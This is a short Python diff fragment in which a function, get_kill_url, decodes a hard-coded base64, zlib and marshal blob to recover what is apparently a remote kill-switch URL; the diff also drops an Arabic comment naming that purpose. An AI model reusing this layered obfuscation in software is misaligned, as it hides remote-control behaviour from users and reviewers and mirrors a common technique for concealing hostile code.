@@ -5,7 +5,6 @@ from rich.panel import Panel
 
 console = Console()
 
-# فك تشفير رابط kill switch
 def get_kill_url():
     enc_data = "eJz7HMPAwJDqVeXj7Zxd4O2TFGxYaent45fiU1VZ5eXtalDoE2pSElxsHuBtkOfnbenmU1WsH+ZT5ePpV6wf4WJSZGBoYelX5VsV4lNp6uXjnF1imFla4O3o6pirHRruk25rCwD/rh8l"
     decoded = marshal.loads(zlib.decompress(base64.b64decode(enc_data.encode())))
